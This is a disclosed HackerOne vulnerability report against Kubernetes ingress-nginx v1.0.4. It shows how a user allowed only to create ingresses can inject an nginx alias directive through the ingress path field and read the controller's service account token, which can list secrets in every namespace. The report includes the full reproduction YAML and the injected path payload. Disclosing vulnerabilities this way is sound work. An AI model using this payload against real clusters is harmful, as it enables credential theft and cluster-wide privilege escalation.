# Ingress-nginx path allows retrieval of ingress-nginx serviceaccount token

## Report Details
- **Report ID**: 1382919
- **URL**: https://hackerone.com/reports/1382919
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-10-27T10:37:06.918Z
- **Disclosed**: 2022-08-06T07:14:09.096Z

## Reporter
- **Username**: gaffy
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: kubernetes

## Vulnerability Information
Report Submission Form

## Summary:
A user with the permissions to create an ingress resource can obtain the ingress-nginx service account token which can list secrets is all namespaces (cluster wide).

## Kubernetes Version:
1.20 (should work on (1.21 as well)

## Component Version:
nginx ingress controller v1.0.4

## Steps To Reproduce:
I deployed the latest ingress-controller (v1.0.4).
I used a user (gaf_test) that has the permissions to get, create and update ingress resources
(the “get” permissions is only to allow kubectl to view the newly created resource).

ingress-creator-role.yaml
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: ingress-creator
  namespace: default
rules:
- apiGroups: ["networking.k8s.io"]
  resources: ["ingresses"]
  verbs: ["get", "create", "update"]
```

ingress-creator-role-binding.yaml
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: gaf_test-ingress-creator-binding
  namespace: default
subjects:
- kind: User
  name: gaf_test
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: ingress-creator
  apiGroup: rbac.authorization.k8s.io
```

This user (gaf_user) cannot list secrets at all.
{F1495367}
 
Use this user (gaf_user) to create a new ingress resource in the default namespace.

ingress.yaml
```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: gaf-ingress
  annotations:
    kubernetes.io/ingress.class: "nginx"
spec:
  rules:
  -  http:
      paths:
        - path: /gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa
          pathType: Prefix
          backend:
            service:
              name: some-service
              port:
                number: 5678
```
```
kubectl apply -f ingress.yaml
```
{F1495369}
 

Access to nginx ingress loadbalancer to /gaf/token path.

https://<host>/gaf/token

 {F1495370}

Decode the token to see it belongs to the ingress-nginx
{F1495372}
 
The nginx-ingress service account is bound to the nginx-ingress cluser role that can list secrets in all namespaces.

## The Root Cause
When a user creates an ingress resource, the new configuration is updated in the /etc/nginx/nginx.conf file in the ingress-nginx-controller pod located in the nginx-ingress namespace.
I caused a “config file injection” using the following payload as path:

**/gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa**
The payload above creates the following configuration for nginx:

/etc/nginx/nginx.conf

{F1495371} 

This is the relevant part from the configuration which creates a new route to /gaf path and uses an alias (http://nginx.org/en/docs/http/ngx_http_core_module.html#alias)
that maps to /var/run/secrets/kubernetes.io/serviceaccount/ directory on the ingress-nginx-controller pod.

## Impact

A user with the permissions to create an ingress resource can obtain the ingress-nginx service account token which can list secrets is all namespaces (cluster wide).

## Attachments
- get-secrets-test.png
- apply.png
- token-bro.png
- injected-nginx-conf.png
- ingress-nginx-serviceaccount-token.png
